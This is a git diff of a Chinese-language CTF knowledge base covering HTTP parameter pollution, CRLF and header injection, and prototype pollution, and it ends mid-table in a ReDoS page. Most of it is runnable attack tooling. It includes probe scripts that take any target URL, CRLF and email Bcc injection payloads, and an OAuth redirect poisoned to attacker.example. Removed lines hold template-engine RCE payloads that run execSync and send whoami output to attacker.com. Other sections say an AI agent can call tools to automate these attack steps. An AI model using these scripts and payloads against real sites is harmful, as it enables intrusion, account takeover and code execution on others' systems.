@@ -5766,192 +5766,197 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # HPP / CRLF Injection / Header Injection
 
-## 1. HTTP Parameter Pollution (HPP)
+HPP 是参数取值差异，CRLF 是头部边界差异。二者的共同点是：前置层、中间件、业务代码和下游服务看到的“同一个输入”不一定相同。
 
-### 原理
+## 输入信号
 
-同参数多次出现时，不同框架取到的值不同：
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 同参数重复时响应变化 | first/last/array/join 取值矩阵 | `role=user&role=admin` 命中不同分支 | 框架固定取值且业务不受影响 |
+| WAF/业务错误不一致 | benign first + payload second | WAF 放行，业务进入 payload 分支 | 两层都看同一值 |
+| redirect/header 可控 | 注入 `%0d%0aX-Test:` | 响应头出现新增 header | header 编码或丢弃换行 |
+| URL 被后端请求 | CRLF 改 Host/header/path | SSRF 下游请求差异 | URL parser 拒绝控制字符 |
+| 邮件/邀请/反馈表单 | Subject/Bcc/Content-Type 头差分 | 邮件头/正文结构改变 | mailer 做 header encoding |
+| JSON body 允许重复键 | `{"a":1,"a":2}` | WAF/业务取不同值 | JSON parser 同层处理 |
 
+## 工作流
+
+```text
+建立 baseline 参数和 header
+  → 构造 duplicate/query/json/form 取值矩阵
+  → 对比 WAF/业务/下游响应差异
+  → 对 Location/Set-Cookie/Cache/Email/SSRF sink 测 CRLF
+  → 用响应头、回连、邮件、缓存或状态变化证明命中
 ```
-?role=user&role=admin
-```
 
-| 框架 | 取值 |
-|------|------|
-| PHP/Apache | `admin` (最后一个) |
-| JSP/Tomcat | `user` (第一个) |
-| ASP.NET/IIS | `user,admin` (数组) |
-| Flask (werkzeug) | `user` (第一个) |
-| Express (qs) | `['user','admin']` (数组) |
-| Go (net/http) | `user` (第一个) |
+## 0. HPP 取值矩阵
 
-### 利用矩阵
+| 平台/解析器 | 常见行为 | 利用方向 |
+|---|---|---|
+| PHP | 最后一个 | WAF 看 first，业务用 last |
+| Java Servlet | `getParameter` first，`getParameterValues` all | 中间件/业务分叉 |
+| ASP.NET | 逗号 join | 拼接后绕过枚举 |
+| Express `qs` | array/object | 类型混淆、PP 串联 |
+| Flask/Werkzeug | first，`getlist` all | 业务取值点差异 |
+| Go `net/http` | first，Values 保留 all | handler 自定义分叉 |
+
+## 1. HPP oracle
 
 ```python
-# hpp_attack.py — 覆盖所有 HPP 利用场景
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import requests
+from urllib.parse import urlencode
+
+def digest(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def cases(param, a, b):
+    return [
+        ("first_second", [(param, a), (param, b)]),
+        ("second_first", [(param, b), (param, a)]),
+        ("array_suffix", [(param, a), (param + "[]", b)]),
+        ("encoded_amp", [(param, a + "%26" + param + "=" + b)]),
+        ("semicolon", f"{param}={a};{param}={b}"),
+        ("comma_join", [(param, f"{a},{b}")]),
+    ]
+
+def hit(url, params):
+    if isinstance(params, str):
+        sep = "&" if "?" in url else "?"
+        r = requests.get(url + sep + params, timeout=10)
+    else:
+        r = requests.get(url, params=params, timeout=10)
+    return {"url": r.url, "status": r.status_code, "hash": digest(r.text), "location": r.headers.get("Location",""), "sample": r.text[:180]}
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--normal", default="user")
+    ap.add_argument("--payload", default="admin")
+    args = ap.parse_args()
+    for name, params in cases(args.param, args.normal, args.payload):
+        print(json.dumps({"case": name, "result": hit(args.url, params)}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：同一语义参数的顺序/数组/编码导致身份、价格、redirect、SQL/SSTI 过滤结果或响应 hash 稳定变化。失败样本：所有变体同一 hash，说明当前参数未被多层差异处理。
+
+## 2. JSON duplicate key
+
+```python
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
 import requests
 
-def hpp_fuzz(target_url: str, param: str, normal: str, malicious: str):
-    """
-    场景 A: WAF 绕过
-    WAF 检查第一个 role=user → 放行
-    后端 PHP 取最后一个 role=admin → 越权
-    """
-    r = requests.get(target_url, params=[
-        (param, normal),
-        (param, malicious),  # 同参数第二次
-    ])
-    return r
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
 
-# 场景 B: 密码重置 — 污染 email 参数
-# POST /reset with email=victim@x.com&email=attacker@x.com
-# WAF 查第一个 → 合法；后端用最后一个 → attacker 收邮件
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--cookie", default="")
+    args = ap.parse_args()
+    bodies = {
+        "role_user_admin": '{"role":"user","role":"admin"}',
+        "price_high_low": '{"price":1000,"price":1}',
+        "redirect_safe_evil": '{"redirect_uri":"https://safe.example","redirect_uri":"https://attacker.example"}',
+    }
+    headers = {"Content-Type": "application/json"}
+    if args.cookie:
+        headers["Cookie"] = args.cookie
+    for name, body in bodies.items():
+        r = requests.post(args.url, data=body, headers=headers, timeout=10)
+        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))
 
-# 场景 C: OAuth redirect_uri 污染
-# redirect_uri=https://legit.com&redirect_uri=https://evil.com
-# 中间件取第一个，OAuth 库取第二个
-
-# 场景 D: SQLi WAF 绕过
-# ?id=1&id=1' OR '1'='1
-# WAF 看到 id=1 → 安全
-# 后端 concat 或取最后一个 → 注入
-
-# 场景 E: 污染 JSON body 多个相同 key
-# {"role":"user","role":"admin"}
-# Python json.loads → admin (覆盖)
+if __name__ == "__main__":
+    main()
 ```
 
-### 自动探测器
+## 3. CRLF sink 矩阵
+
+| Sink | Payload | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Location` | `%0d%0aSet-Cookie: crlf=1` | 响应头新增 cookie/header | header value 被 encode |
+| `Set-Cookie` | `%0d%0aX-Injected: 1` | 新 header 出现 | cookie parser 拒绝 |
+| cache key/header | `%0d%0aCache-Control: public` | 缓存状态改变 | CDN 丢弃换行 |
+| SSRF URL | `%0d%0aHost: internal` | 下游 listener 看到 header | URL parser reject |
+| email subject/name | `x%0d%0aBcc: ...` | 邮件头结构变化 | mailer 编码头部 |
 
 ```python
-# 批量探测不同框架的 HPP 行为
-HPP_PROBES = [
-    # 单参数多次
-    "?id=1&id=2",
-    "?user=guest&user=admin",
-    # URL 编码变体
-    "?user=guest%26user=admin",
-    "?user=guest&user[]=admin",
-    # 分号分隔
-    "?user=guest;user=admin",
-    # U+0026 全角
-    "?user=guest＆user=admin",
-]
-```
+#!/usr/bin/env python3
+import argparse
+import json
+import requests
 
----
-
-## 2. CRLF Injection
-
-```python
-# ===== HTTP Response Splitting (CRLF in header value) =====
-# 在 Location / Set-Cookie 等 header 中注入 \r\n
-
-CRLF_PAYLOADS = [
-    # 基础
-    "\r\nSet-Cookie: injected=true",
-    "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n<script>alert(1)</script>",
-    # 编码
-    "%0d%0aSet-Cookie:%20injected=true",
-    "%0D%0ASet-Cookie:%20injected=true",
-    "\\r\\nSet-Cookie: injected=true",
-    # 绕过 WAF 只过滤 \r\n 但忽略单独的 \r 或 \n
-    "\nSet-Cookie: injected=true",
-    "\rSet-Cookie: injected=true",
-    # Unicode
-    "
-Set-Cookie: injected=true",
-]
-```
-
-### CRLF→SSRF 链
-
-```python
-# 如果可控 header 值 (如 X-Forwarded-For) 被拼接到后端 HTTP 请求:
-# GET /api?url=http://127.0.0.1:%0d%0aHost:%20evil.com%0d%0a
-# → SSRF + Host 注入
-
-# CRLF→Cache Poisoning 链
-# X-Forwarded-Host: evil.com%0d%0aX-Cache: miss
-# → CDN 可能缓存注入的内容
-```
-
-### Email 注入 (SMTP CRLF)
-
-```python
-# 如果目标有"联系我们"/"反馈"/"邀请" 表单
-# 后端用 mail() 发送但没有净化
-
-# CRLF 注入 → 劫持邮件头
 PAYLOADS = [
-    # BCC 注入 — 密送给自己
-    "test\r\nBcc: attacker@evil.com",
-    # 修改 Subject
-    "test\r\nSubject: <script>alert(1)</script>",
-    # 完全劫持邮件正文 (后面的内容变正文)
-    "test\r\n\r\nAttacker controlled body",
-    # 多收件人
-    "test\r\nTo: admin@target.com,\r\nTo: attacker@evil.com",
-    # Content-Type 改变 (HTML注入)
-    "test\r\nContent-Type: text/html\r\n\r\n<h1>Phish</h1>",
+    "%0d%0aX-Injected: crlf_probe",
+    "%0D%0ASet-Cookie:%20crlf_probe=1",
+    "%0aX-Injected:%20lf_probe",
+    "%0dX-Injected:%20cr_probe",
+    "%250d%250aX-Injected:%2520double_encoded",
 ]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True, help="Use {payload} placeholder")
+    args = ap.parse_args()
+    for p in PAYLOADS:
+        url = args.url.replace("{payload}", p)
+        r = requests.get(url, allow_redirects=False, timeout=10)
+        interesting = {k: v for k, v in r.headers.items() if "Injected" in k or "Set-Cookie" in k or "Location" in k}
+        print(json.dumps({"payload": p, "status": r.status_code, "headers": interesting, "body": r.text[:120]}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-将上面的 payload 放入当前 case 的最小复现脚本；不要把目标域名、Cookie、邮箱或
-请求抓包提交到公共仓库。
+## 4. 组合攻击链
 
----
+```text
+HPP redirect_uri
+  → OAuth 中间件取 first，业务取 last
+  → code/token 回到 attacker callback
 
-## 3. Header Injection via URL
+HPP amount/role
+  → WAF/校验层看 normal
+  → 业务层取 payload
+  → 订单、权限、flag 差异
 
-```python
-# 如果后端把用户 URL 作为 HTTP 请求的目标
-# 在 URL 中注入 \r\n 拆分请求:
+CRLF Location
+  → 响应头注入 Set-Cookie/Cache-Control
+  → session fixation / cache poisoning / XSS 二跳
 
-# Redis via CRLF in URL
-"http://127.0.0.1:6379/%0d%0aSET%20key%20value%0d%0a"
-
-# Elasticsearch via CRLF
-"http://127.0.0.1:9200/%0d%0aGET%20/_search%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a"
+CRLF SSRF URL
+  → 下游 Host/header/path 差异
+  → 内网服务探测或协议拼接
 ```
-
----
-
-## 4. 攻击链
-
-```
-CRLF in URL param → SSRF → Redis/Gopher → RCE
-CRLF in redirect → Response Splitting → XSS
-CRLF in email → BCC injection → 邮件窃取 → Token 重置劫持
-HPP bypass WAF → SQLi/SSTI → RCE
-HPP OAuth redirect_uri → 授权码窃取 → Account Takeover
-```
-
-## 工具引用
-
-```bash
-# 通用 HTTP 探测框架；目标参数由当前 case 提供
-python scripts/ctf-website/http_probe.py https://example.test/
-
-# 安装缺失工具
-powershell scripts/ctf-website/install_missing_tools.ps1
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| HTTP 参数污染探测 | `http_probe` | 发送 HPP/CRLF payload |
-| 按信号查技术 | `kb_router` | 搜索 hpp/crlf 相关技术文件 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| 参数矩阵 | 参数名、顺序、编码、数组/分号/JSON 重复键 |
+| 解析差异 | WAF/中间件/业务/下游响应状态、hash、错误文本 |
+| Header sink | 可控 header、payload 编码层数、新增响应头 |
+| 成功样本 | redirect、cookie、cache、订单、权限、OAuth code、flag 差异 |
+| 失败样本 | 所有变体同 hash、换行被编码、pre-parser 拒绝控制字符 |
+| 下一跳 | redirect 转 OAuth；cache 转 08-infra；SSRF 转 04-ssrf；金额转 payment |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 参数矩阵 | `http_probe` | 发送 duplicate/query/json/form 变体 |
+| Header sink | `http_probe` | 固定 redirect/header 参数并比较响应头 |
+| 知识路由 | `kb_router` | 按 HPP、CRLF、header injection、parser differential 搜索 |
 
 
 ---
@@ -5964,301 +5969,200 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # Prototype Pollution (原型链污染)
 
-在 Node.js (JavaScript) 环境中，`Object.prototype` 是所有普通对象的基类。当程序不安全地将不可信的 JSON 键值对递归合并到现有对象中时，可能会导致**原型链污染**。这能修改所有新建对象的默认属性，从而绕过鉴权，甚至通过污染特定的模板引擎或子进程选项达成 **RCE**。
+原型链污染的核心判断是：不可信键名是否进入递归 merge / path setter / parser，并最终影响某个 sink。单独证明 `{}.polluted === "yes"` 还不够，必须继续证明它改变了鉴权、模板、请求、日志、子进程、渲染或前端路由的行为。
 
----
+## 输入信号
 
-## 1. 污染源头 (Sources) 与检测
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| JSON body 被 deep merge | 发送 `__proto__` 与 `constructor.prototype` 双路线 | 后续空对象继承 marker，或业务响应变化 | parser 保留 key 但 merge 跳过危险段 |
+| `qs`/嵌套 query 参数 | 测 `a[b]=c`、数组、点号解析 | `__proto__[x]=y` 进入对象 | query parser 关闭嵌套 |
+| 配置对象默认值 | 污染 `isAdmin/role/debug/template` | 未显式字段的对象获得默认权限或路径 | 业务只读 own property |
+| 模板引擎 | 路由到 EJS/Pug/Handlebars options | 渲染错误、输出函数名、helper 行为变化 | options 用 null-prototype 对象 |
+| 客户端 hash/query 合并 | fragment PP + DOM sink | 前端路由/按钮/API base 改变 | 解析后做 schema 白名单 |
+| postMessage/JSON.parse | 发送对象 payload | handler merge 后状态变化 | structured clone 后被 validator 拒绝 |
 
-原型链污染通常源于不安全的**深拷贝 (Deep Copy)**、**对象合并 (Merge)** 或**路径赋值 (Path Setter)** 函数：
+## 工作流
 
-```javascript
-// 典型的脆弱 merge 函数
-function merge(target, source) {
-    for (let key in source) {
-        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
-            merge(target[key], source[key]); // 递归合并
-        } else {
-            target[key] = source[key];
-        }
-    }
-}
+```text
+定位 parser 与 merge/source
+  → 用 marker key 建污染 baseline
+  → 测 __proto__ / constructor.prototype / dotted path 变体
+  → 选择业务 sink: auth/template/process/log/client route
+  → 用同一 oracle 证明状态、权限、输出或 flag 差异
+  → 记录成功样本和失败样本
 ```
 
-### 探测 Payload
-我们可以输入如下参数：
-*   **JSON 格式**：
-    ```json
-    {
-      "__proto__": {
-        "polluted": "yes"
-      }
-    }
-    ```
-*   **对于禁止了 `__proto__` 键名但没有防范 `constructor` 的过滤器**：
-    ```json
-    {
-      "constructor": {
-        "prototype": {
-          "polluted": "yes"
-        }
-      }
-    }
-    ```
-*   **验证方法**：
-    在控制台中新建一个普通空对象 `const obj = {};`。若 `obj.polluted === "yes"`，则证明污染成功。
+## 0. Source 与 sink 判定矩阵
 
----
+| Source | Payload 形态 | Sink 候选 | 观察点 |
+|---|---|---|---|
+| JSON body | `{"__proto__":{"pp":"x"}}` | API 默认 role/config | `/api/me`、错误字段、权限菜单 |
+| Query string | `?__proto__[pp]=x` | Express/qs 中间件 | 后续请求是否继承 marker |
+| Form body | `__proto__[pp]=x` | body-parser + merge | 响应 hash、状态字段 |
+| postMessage | `{"constructor":{"prototype":...}}` | 前端 store/router | DOM、API base、token |
+| YAML/TOML config | `__proto__:` | 任务 runner/config | job 参数、渲染路径 |
+| package option | `constructor.prototype` | template/log/process options | 渲染错误、helper/format 行为 |
 
-## 2. 高价值利用链 (Exploit Sinks)
-
-原型链污染成功后，需要找到被称为 **Sink** 的触发点才能将其转化为真正的危害。
-
-### A. EJS 模板引擎注入 (RCE)
-EJS 在渲染时，会读取配置对象中的 `outputFunctionName` 属性，如果不为 undefined，则使用 `eval` 动态生成渲染函数：
-
-*   **漏洞 Sink 分析**：
-    在 `ejs.js` 中有类似代码：`var fn = new Function(opts.localsName, ... ... + opts.outputFunctionName + ...)`。
-*   **Payload 构造**：
-    通过原型链污染设置 `outputFunctionName` 为恶意 JS 语句：
-    ```json
-    {
-      "__proto__": {
-        "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://attacker.com/' + exec('whoami')); //"
-      }
-    }
-    ```
-    当应用随后调用 `ejs.render(template, data)` 时，恶意代码在 eval 中执行，实现命令执行。
-
-### B. Pug 模板引擎注入 (RCE)
-Pug 也有类似的模板选项漏洞。Pug 编译函数时，如果选项中包含 `self`，它会通过加载某些特殊节点动态构建执行代码。
-
-*   **Payload 构造**：
-    ```json
-    {
-      "__proto__": {
-        "self": true,
-        "line": "console.log(global.process.mainModule.require('child_process').execSync('whoami').toString())"
-      }
-    }
-    ```
-
-### C. 子进程 `child_process.spawn` 污染 (RCE)
-当后端调用 `child_process.spawn()` 或 `fork()`，但未指定 `shell`、`env` 等属性时，它会从 `Object.prototype` 中去获取这些选项。
-
-*   **污染 `shell` 与 `argv`**：
-    如果我们将 `shell` 污染为恶意的可执行文件路径，或者向其注入额外的环境变量，即可在后端派生子进程的瞬间劫持控制流：
-    ```json
-    {
-      "__proto__": {
-        "shell": "node",
-        "argv0": "-e",
-        "NODE_OPTIONS": "--require=/tmp/evil.js"
-      }
-    }
-    ```
-
----
-
-## 3. 防范与环境修复 (Clean-up)
-
-在 CTF 漏洞验证完毕后，如果环境是长生命周期的应用（如常驻的 Node.js Web 服务），原型链污染修改的是运行时的全局基类。如果不及时清理，可能会导致后端崩溃，或者让其他队伍直接利用你的污染成果。
-
-*   **手动复位**：
-    污染成功后，使用 Python 或 Curl 发送复位 Payload 擦除属性：
-    ```json
-    {
-      "__proto__": {
-        "outputFunctionName": null,
-        "polluted": null
-      }
-    }
-    ```
----
-
-## 4. Server-Side PP via Query Parser
+## 1. 服务端 PP oracle
 
 ```python
-# qs (Node.js query string 库) 允许创建嵌套对象:
-# GET /api/users?__proto__[isAdmin]=true
-# 被 qs 解析为: {"__proto__": {"isAdmin": "true"}}
-
-# 如果这个对象随后被 Object.assign 或 merge 到其他对象:
-# → Object.prototype.isAdmin = "true"
-# → 所有新对象继承 isAdmin = true
-# → 鉴权绕过
-
-def test_qs_pp(target: str):
-    """测试 query string → prototype pollution"""
-    probes = [
-        "__proto__[polluted]=yes",
-        "__proto__.polluted=yes",
-        "constructor[prototype][polluted]=yes",
-        "__proto__[isAdmin]=true",
-        "__proto__[role]=admin",
-    ]
-    for probe in probes:
-        r = requests.get(f"{target}?{probe}")
-        r2 = requests.get(f"{target}/api/me")
-        if "admin" in r2.text or r2.status_code != 401:
-            print(f"[!] Potential PP via QS: {probe}")
-```
-
----
-
-## 5. 更多 Node.js Sinks
-
-### Handlebars RCE
-
-```json
-{"__proto__": {"precompileOptions": {"knownHelpersOnly": false}}}
-```
-
-### Morgan (Logger) 注入
-
-```json
-{"__proto__": {"format": "':  require('child_process').execSync('id') //"}}
-```
-
-### Node-Serialize → RCE
-
-```json
-{"__proto__": {"type": "function", "body": "return require('child_process').execSync('id').toString()"}}
-```
-
-### MSR (Mini-Static-Resource) → RCE
-
-```json
-{"__proto__": {"root": "/", "path": "/flag"}}
-```
-
----
-
-## 6. Client-Side PP (DOM 污染)
-
-```javascript
-// 当客户端 JS 做 Object.assign 或 spread 时
-// URL: https://target.com/#__proto__[isAdmin]=true
-// JS 解析 hash 或 query params 后 merge → 污染 Object.prototype
-
-// 检测: 在 Console 执行
-console.log({}.isAdmin)  // 如果返回 true → 已被污染
-```
-
----
-
-## 7. PP 探测脚本
-
-```python
-# 自动检测 prototype pollution 入口
+#!/usr/bin/env python3
+import argparse
+import copy
+import hashlib
+import json
 import requests
 
-PP_PROBES = [
-    # JSON
-    ('json', {"__proto__": {"polluted": "yes"}}),
-    ('json', {"constructor": {"prototype": {"polluted": "yes"}}}),
-    ('json', {"__proto__": {"isAdmin": True}}),
-    # Query string
-    ('qs', "__proto__[polluted]=yes"),
-    ('qs', "constructor[prototype][polluted]=yes"),
-    # Form data
-    ('form', {"__proto__[polluted]": "yes"}),
-    ('form', {"constructor[prototype][polluted]": "yes"}),
+PAYLOADS = [
+    ("json_proto_marker", "json", {"__proto__": {"pp_marker": "pp_yes"}}),
+    ("json_ctor_marker", "json", {"constructor": {"prototype": {"pp_marker": "pp_yes"}}}),
+    ("json_role", "json", {"__proto__": {"isAdmin": True, "role": "admin"}}),
+    ("qs_proto_marker", "qs", "__proto__[pp_marker]=pp_yes"),
+    ("qs_ctor_marker", "qs", "constructor[prototype][pp_marker]=pp_yes"),
+    ("form_proto_marker", "form", {"__proto__[pp_marker]": "pp_yes"}),
+    ("form_ctor_marker", "form", {"constructor[prototype][pp_marker]": "pp_yes"}),
 ]
 
-def probe_pp(target_url: str, endpoints: list[str]):
-    for ep in endpoints:
-        for fmt, payload in PP_PROBES:
-            if fmt == 'json':
-                r = requests.post(target_url + ep, json=payload)
-            elif fmt == 'qs':
-                r = requests.get(target_url + ep + '?' + payload)
-            else:
-                r = requests.post(target_url + ep, data=payload)
-            # 看是否有异常响应
-            if r.status_code not in (400, 401, 403, 404):
-                print(f"  [{fmt}] {ep}: {r.status_code}")
+def digest(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def send(base, path, case, kind, payload, cookie=""):
+    sess = requests.Session()
+    if cookie:
+        sess.headers["Cookie"] = cookie
+    url = base.rstrip("/") + path
+    if kind == "json":
+        r = sess.post(url, json=payload, timeout=10)
+    elif kind == "form":
+        r = sess.post(url, data=payload, timeout=10)
+    else:
+        r = sess.get(url + ("&" if "?" in url else "?") + payload, timeout=10)
+    return {"case": case, "status": r.status_code, "hash": digest(r.text), "sample": r.text[:180]}
+
+def oracle(base, path, cookie=""):
+    headers = {"Cookie": cookie} if cookie else {}
+    r = requests.get(base.rstrip("/") + path, headers=headers, timeout=10)
+    return {"status": r.status_code, "hash": digest(r.text), "sample": r.text[:220]}
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base", required=True)
+    ap.add_argument("--source-path", required=True)
+    ap.add_argument("--oracle-path", required=True)
+    ap.add_argument("--cookie", default="")
+    args = ap.parse_args()
+    print(json.dumps({"baseline": oracle(args.base, args.oracle_path, args.cookie)}, ensure_ascii=False))
+    for case, kind, payload in PAYLOADS:
+        sent = send(args.base, args.source_path, case, kind, payload, args.cookie)
+        after = oracle(args.base, args.oracle_path, args.cookie)
+        print(json.dumps({"send": sent, "after": after}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
----
+成功样本：发送 marker 后，后续独立 oracle 的身份、权限、配置、错误文本或响应 hash 稳定变化。失败样本：source 接收 payload 但 oracle 不变，说明没有可用 sink 或污染被隔离在局部对象。
 
-## 8. 攻击链
+## 2. key 变体与 parser 差分
 
-```
-PP → EJS outputFunctionName → RCE
-PP → Pug self+line → RCE
-PP → child_process.spawn shell → RCE
-PP → Morgan format → 任意代码执行
-PP → Handlebars knownHelpers → 模板注入 → RCE
-PP via QS → Object.assign → isAdmin=true → 鉴权绕过
-Client-Side PP → __proto__.isAdmin → 前端路由绕过
-PP → bypass rate limit → 修改 limit 默认值 → 无限请求
+| 变体 | 用途 |
+|---|---|
+| `__proto__` | 常规对象原型路线 |
+| `constructor.prototype` | `__proto__` 被过滤时的替代路线 |
+| `prototype` | class/function option 污染 |
+| `a.__proto__.x` | dot notation path setter |
+| `a[__proto__][x]` | bracket parser |
+| `__%70roto__` | 解码顺序差分 |
+| `constructor[prototype][x]` | qs/body-parser 路线 |
 
-## 9. Advanced PP (2024-2025)
+## 3. sink 路由
 
-### Constructor.prototype Bypass
+| Sink | 污染 key | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 鉴权默认值 | `isAdmin`, `role`, `permissions` | 新对象默认进入 admin 分支 | 只用 `hasOwnProperty` |
+| 模板引擎 options | `outputFunctionName`, `compileDebug`, `client` | 渲染输出/错误栈变化 | options 固定白名单 |
+| 子进程 options | `shell`, `env`, `argv0` | job/convert/export 行为变化 | 显式 options 覆盖原型 |
+| 日志/格式化 | `format`, `stream`, `level` | 日志输出结构变化 | logger 使用 own config |
+| HTTP client | `baseURL`, `headers`, `method` | SSRF/请求头/路径改变 | URL 重新构造 |
+| 前端 store | `apiBase`, `isAdmin`, `redirect` | DOM/API/路由变化 | schema 校验拒绝 |
 
-```json
-// 当 __proto__ 被 WAF 过滤:
-{"constructor": {"prototype": {"isAdmin": true}}}
-// Object.constructor.prototype.isAdmin = true → 所有对象继承
+## 4. 客户端 PP harness
 
-// 链: constructor.prototype.toString = null
-// → 强制错误 → catch 块 eval config.debug.code
-```
-
-### React RSC Flight Protocol RCE (CVE-2025-55182)
-
-```python
-# React Server Components Flight protocol 反序列化
-# 注入 __proto__ via Chunk → promise resolution hijack
-# → require('child_process') → RCE
-
-# PP payload for RSC stream:
-RSC_PP_PAYLOAD = {
-    "__proto__": {
-        "then": "require('child_process').execSync('id')"
+```html
+<!doctype html>
+<meta charset="utf-8">
+<script>
+function parseHash() {
+  const out = {};
+  for (const part of location.hash.slice(1).split("&")) {
+    const [k, v] = part.split("=");
+    if (!k) continue;
+    const m = k.match(/^(.+)\[(.+)\]$/);
+    if (m) {
+      out[m[1]] = out[m[1]] || {};
+      out[m[1]][m[2]] = decodeURIComponent(v || "");
+    } else {
+      out[k] = decodeURIComponent(v || "");
     }
+  }
+  return out;
 }
+function merge(a, b) {
+  for (const k in b) {
+    if (b[k] && typeof b[k] === "object") {
+      a[k] = a[k] || {};
+      merge(a[k], b[k]);
+    } else {
+      a[k] = b[k];
+    }
+  }
+  return a;
+}
+const before = {}.pp_marker;
+merge({}, parseHash());
+fetch("https://listener.example/pp", {
+  method: "POST",
+  mode: "no-cors",
+  body: JSON.stringify({before, after: {}.pp_marker, admin: {}.isAdmin, href: location.href})
+});
+</script>
 ```
 
-### Class Pollution (devalue CVE-2025-57820)
+测试 URL：
 
-```javascript
-// 污染特定 class prototype → 而非全局 Object
-// devalue library → 递归深拷贝时 constructor.prototype 被重写
-
-{"constructor": {"prototype": {"isAdmin": true}}}
-// → User 类的 prototype 被污染 → 所有 User 实例 isAdmin=true
+```text
+https://target.example/page#constructor[prototype]=x&__proto__[pp_marker]=pp_yes&__proto__[isAdmin]=true
 ```
 
-### Post-Extraction PP
+## 攻击链
 
-```python
-# NODE_OPTIONS + shell 污染 → P大RCE（即使只能污染客户端对象）
-
-# PP payload:
-{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /tmp/evil.js"}}
-# → child_process.spawn 继承 shell → node → 读 NODE_OPTIONS
-# → require /tmp/evil.js → evil.js 执行 → RCE
+```text
+parser/source 命中
+  → marker 证明原型污染
+  → 业务 sink 路由
+  → auth/template/process/client route oracle
+  → 权限、渲染、请求、flag 差异
 ```
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| HTTP 探测 | `http_probe` | 发送 prototype pollution payload |
-| 按信号查技术 | `kb_router` | 搜索 prototype pollution 相关技术文件 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| Source | URL、method、content-type、parser、payload 形态 |
+| 污染证明 | marker key、前后 oracle、响应 hash、错误文本 |
+| Sink | key 名、触发路径、业务动作、状态变化 |
+| 成功样本 | 权限/渲染/请求/flag 差异可重复出现 |
+| 失败样本 | parser 不解析嵌套、merge 跳过 key、sink 只读 own property |
+| 下一跳 | 前端转 `07-client/js-runtime/postmessage`；模板转 SSTI；token 转 JWT |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| HTTP source 探测 | `http_probe` | 发送 JSON/QS/Form PP 变体 |
+| 浏览器 harness | `jshook` | 观察前端 merge/store/router 行为 |
+| 知识路由 | `kb_router` | 按 prototype pollution、qs、模板 sink 信号搜索 |
 
 
 ---
@@ -6271,176 +6175,214 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # ReDoS & 时序攻击
 
-## Catastrophic Backtracking (ReDoS)
+ReDoS 是算法复杂度输入，Timing 是响应时间侧信道。两者都不能凭一次慢响应下结论，必须建立 baseline、增长曲线、样本分布和失败样本。
 
-```python
-# 恶意正则构造 — 指数级回溯
-EVIL_REGEX_PATTERNS = {
-    # 模式 A: (a+)+$ — 嵌套量词
-    # "aaaaaaaaaaaaaaaaaaaa!"  → 回溯 2^n 次
-    "nested_plus": r"(a+)+$",
-    "nested_star": r"(a*)*$",
-    "alt_group": r"(a|aa)+$",
-    "group_ref": r"(\w+)=(\w+)*",
+## 输入信号
 
-    # 模式 B: 实际 WAF/库中的 ReDoS 漏洞
-    "email_validation": r"^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,}|[0-9]{1,3})(\]?)$",
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
